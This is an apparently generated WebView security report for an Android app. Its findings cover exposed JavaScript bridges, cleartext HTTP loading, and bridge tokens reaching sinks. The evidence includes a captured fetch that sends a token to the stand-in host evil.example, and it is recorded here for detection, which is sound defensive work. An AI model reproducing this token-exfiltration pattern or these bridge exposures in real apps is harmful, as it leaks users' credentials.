# Sentry WebView Security Report

## Summary

- Risk score: 100/100
- Events analyzed: 12
- Findings: 9
- WebViews observed: 1
- Skipped non-event lines: 0

## Severity Counts

- Critical: 3
- High: 3
- Medium: 3
- Low: 0
- Info: 0

## Findings

### 1. [CRITICAL] Sensitive native bridge data reached a JavaScript sink

- Rule: `WV-TAINTED-BRIDGE-DATA-TO-JS-SINK`
- Description: A value returned by a sensitive-looking native JavaScript bridge method flowed into a JavaScript sink such as network, navigation, postMessage, eval, or storage.
- Recommendation: Avoid returning sensitive native data directly to JavaScript. If this bridge is required, restrict it to trusted origins and prevent sensitive values from reaching network or navigation sinks.
- Evidence:
  - `{"arguments": ["http://evil.example/x?t=tok-123"], "href": "http://remote.example/page", "sink": "fetch", "sinkUrl": "http://evil.example/x?t=tok-123", "taints": [{"id": "taint-1-0", "source": {"interfaceName": "AppBridge", "methodName": "getToken"}, "valuePreview": "tok-123"}], "timestamp": "2026-01-01T00:00:09.000Z", "webViewId": "android.webkit.WebView:111"}`

### 2. [CRITICAL] Sensitive native bridge data reached a JavaScript sink

- Rule: `WV-TAINTED-BRIDGE-DATA-TO-JS-SINK`
- Description: A value returned by a sensitive-looking native JavaScript bridge method flowed into a JavaScript sink such as network, navigation, postMessage, eval, or storage.
- Recommendation: Avoid returning sensitive native data directly to JavaScript. If this bridge is required, restrict it to trusted origins and prevent sensitive values from reaching network or navigation sinks.
- Evidence:
  - `{"arguments": ["tok-123", "https://parent.example"], "href": "http://remote.example/page", "sink": "window.postMessage", "sinkUrl": "https://parent.example", "taints": [{"id": "taint-1-0", "source": {}, "valuePreview": "tok-123"}], "timestamp": "2026-01-01T00:00:10.000Z", "webViewId": "android.webkit.WebView:111"}`

### 3. [CRITICAL] Sensitive native bridge data reached a JavaScript sink

- Rule: `WV-TAINTED-BRIDGE-DATA-TO-JS-SINK`
- Description: A value returned by a sensitive-looking native JavaScript bridge method flowed into a JavaScript sink such as network, navigation, postMessage, eval, or storage.
- Recommendation: Avoid returning sensitive native data directly to JavaScript. If this bridge is required, restrict it to trusted origins and prevent sensitive values from reaching network or navigation sinks.
- Evidence:
  - `{"arguments": ["k", "tok-123"], "href": "http://remote.example/page", "sink": "localStorage.setItem", "sinkUrl": null, "taints": [{"id": "taint-1-0", "source": {}, "valuePreview": "tok-123"}], "timestamp": "2026-01-01T00:00:11.000Z", "webViewId": "android.webkit.WebView:111"}`

### 4. [HIGH] Cleartext HTTP content loaded in WebView

- Rule: `WV-CLEARTEXT-URL`
- Description: The WebView loaded content over HTTP. Cleartext traffic can be intercepted or modified, which is especially dangerous when JavaScript bridges are exposed.
- Recommendation: Use HTTPS for WebView content and disable cleartext traffic in the Android network security configuration.
- Evidence:
  - `{"source": "loadUrl", "timestamp": "2026-01-01T00:00:00.000Z", "url": "http://remote.example/page", "webViewId": "android.webkit.WebView:111"}`

### 5. [HIGH] Sensitive-looking JavaScript bridge method exposed

- Rule: `WV-SENSITIVE-BRIDGE-METHOD`
- Description: A JavaScript bridge exposes a method whose name suggests access to sensitive data, permissions, files, device identifiers, or device capabilities.
- Recommendation: Audit the method implementation, require trusted-origin checks, and avoid returning sensitive native data directly to JavaScript.
- Evidence:
  - `{"args": [], "className": "com.example.Bridge", "interfaceName": "AppBridge", "method": "getToken", "timestamp": "2026-01-01T00:00:03.000Z", "webViewId": "android.webkit.WebView:111"}`

### 6. [HIGH] Sensitive-looking JavaScript bridge method exposed

- Rule: `WV-SENSITIVE-BRIDGE-METHOD`
- Description: A JavaScript bridge exposes a method whose name suggests access to sensitive data, permissions, files, device identifiers, or device capabilities.
- Recommendation: Audit the method implementation, require trusted-origin checks, and avoid returning sensitive native data directly to JavaScript.
- Evidence:
  - `{"args": ["java.lang.String"], "className": "com.example.Ghost", "interfaceName": "Ghost", "method": "readFile", "timestamp": "2026-01-01T00:00:05.000Z", "webViewId": "android.webkit.WebView:111"}`

### 7. [MEDIUM] JavaScript bridge exposed to WebView content

- Rule: `WV-JS-BRIDGE-EXPOSED`
- Description: A native object was exposed to JavaScript through addJavascriptInterface. Any page that can run JavaScript in this WebView can attempt to call annotated public methods.
- Recommendation: Expose bridges only to trusted origins, remove the bridge before loading untrusted content, and enforce origin checks in every sensitive method.
- Evidence:
  - `{"className": "com.example.Bridge", "interfaceName": "AppBridge", "origin": "http://remote.example", "pageUrl": "http://remote.example/page", "timestamp": "2026-01-01T00:00:01.000Z", "trusted": true, "webViewId": "android.webkit.WebView:111"}`

### 8. [MEDIUM] JavaScript bridge exposed to WebView content

- Rule: `WV-JS-BRIDGE-EXPOSED`
- Description: A native object was exposed to JavaScript through addJavascriptInterface. Any page that can run JavaScript in this WebView can attempt to call annotated public methods.
- Recommendation: Expose bridges only to trusted origins, remove the bridge before loading untrusted content, and enforce origin checks in every sensitive method.
- Evidence:
  - `{"className": "com.example.Other", "interfaceName": "Other", "origin": "http://remote.example", "pageUrl": "http://remote.example/page", "timestamp": "2026-01-01T00:00:02.000Z", "trusted": true, "webViewId": "android.webkit.WebView:111"}`

### 9. [MEDIUM] WebView JavaScript contacted a cleartext URL

- Rule: `WV-JS-CLEARTEXT-NETWORK`
- Description: JavaScript running inside the WebView made or prepared a cleartext HTTP request.
- Recommendation: Use HTTPS endpoints and apply Content Security Policy or application-level URL allowlists.
- Evidence:
  - `{"api": "fetch", "href": "http://remote.example/page", "timestamp": "2026-01-01T00:00:09.000Z", "url": "http://evil.example/x?t=tok-123", "webViewId": "android.webkit.WebView:111"}`


## WebView Inventory

### WebView android.webkit.WebView:111

- URLs observed: 1
- Settings observed: 0
- Bridges observed: 2
- Bridge methods observed: 3
- Bridge calls observed: 2
- JavaScript events observed: 4
- Recent URLs:
  - `http://remote.example/page`


## Sensitive Data Flows

### WebView android.webkit.WebView:111

- Sink: `fetch`
  - Page: `http://remote.example/page`
  - Destination: `http://evil.example/x?t=tok-123`
  - Source: `AppBridge.getToken` (unknown class)
  - Value preview: `tok-123`
- Sink: `window.postMessage`
  - Page: `http://remote.example/page`
  - Destination: `https://parent.example`
  - Source: `None.None` (unknown class)
  - Value preview: `tok-123`
- Sink: `localStorage.setItem`
  - Page: `http://remote.example/page`
  - Source: `None.None` (unknown class)
  - Value preview: `tok-123`


## Origin To Bridge Map

### WebView android.webkit.WebView:111

#### `http://remote.example`

- Classification: trusted, remote
- Page URLs:
  - `http://remote.example/page`
- Bridges:
  - `AppBridge` (com.example.Bridge): 2 methods, 2 calls
    - Methods: `getToken`, `ping`
    - Call: `getToken` at `http://remote.example/page`
    - Call: `ping` at `http://remote.example/page`
  - `Other` (com.example.Other): 0 methods, 0 calls

#### `unknown`

- Classification: untrusted, local
- Bridges:
  - `Ghost` (com.example.Ghost): 1 methods, 0 calls
    - Methods: `readFile`
